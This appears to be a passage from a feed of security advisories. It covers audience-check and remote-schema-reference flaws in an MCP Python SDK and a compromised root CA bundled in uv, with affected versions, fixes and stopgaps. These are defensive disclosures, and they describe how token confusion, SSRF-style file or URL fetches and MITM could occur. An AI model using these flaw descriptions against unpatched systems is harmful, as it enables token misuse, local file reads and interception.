FollowRedirectsAnyway(headers=headers, auth=auth,                                  timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300)) # sse_client(url, httpx_client_factory=client_factory) ```  The redirect handling is then the HTTP library's own, as before the fix: a lone `Authorization` header is still dropped on cross-origin hops and `301`/`302`/`303` become `GET`. It is not something the SDK supports or tests.  </details>  ---

### Summary In affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.  ### Am I affected? Yes, if your HTTP server uses the SDK's bearer authentication (`auth=AuthSettings(...)` with `token_verifier=`), its authorization server also issues tokens for other services, and your `TokenVerifier` does not check the token's audience (`aud`) itself.  Affected versions:  - `mcp` 1.10.0 through 1.29.1 - `mcp` 2.0.0 through 2.1.1  ### Fix Upgrade to:  - 1.x: `mcp` 1.30.0 or later - 2.x: `mcp` 2.2.0 or later  **Upgrading alone changes nothing.** The patched versions add a `validate_token_resource` setting that is off unless you set it. To turn the check on, make both of these changes together:  1. Set `validate_token_resource=True` in `AuthSettings`, with `resource_server_url` set to the audience your authorization server puts in tokens for your server. 2. Return the token's audience from `verify_token()` as `AccessToken.resource`.  A token for another service then gets `401`. With only the first change, every request gets `401`.  If your `TokenVerifier` already checks the audience, set `validate_token_resource=False` to silence the deprecation warning. The setting will default to `True` in 3.0.  If you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verify_token()`. That closes the issue on every version.

### Summary In affected versions, when a connected MCP server declared an `outputSchema` for a tool, the SDK's client validated each `call_tool` result with `jsonschema`'s default resolver, which fetches any `$ref` it cannot resolve locally by opening the URL. A server could therefore put an `http://`, `https://` or `file://` reference in a tool's output schema and make the client:  - request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and - stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.  ### Am I affected? Yes, if your application uses the SDK as an MCP client (`ClientSession` over any transport, `ClientSessionGroup`, or the 2.x `Client`) and calls tools on servers you do not fully control. There was no setting that turned the validation off.  Affected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.  Not affected: applications that only build servers. If nothing in your code uses `ClientSession`, `ClientSessionGroup` or the 2.x `Client` class, you are not affected.  ### Fix Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with `RuntimeError` (`Invalid schema for tool ...`); in-document references such as `#/$defs/...` work as before.  Until you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose `outputSchema` contains an `$id`, or a `$ref` / `$dynamicRef` that does not start with `#`.

By default, uv verifies TLS connections against a vendored copy of the `webpki-root-certs` bundle. Versions before 0.13.4 include the `emSign ECC Root CA - G3` root. Eight eMudhra intermediate CA certificates that chain to that root have compromised private keys, and the CA has revoked them.  An attacker with one of the compromised keys can issue certificates that uv accepts for any hostname, and can be used to issue certificates to enable MITM attacks.  uv 0.13.4 removes the root from its vendored bundle, following `webpki-root-certs` 1.0.10. Upgrade to 0.13.4 or later.
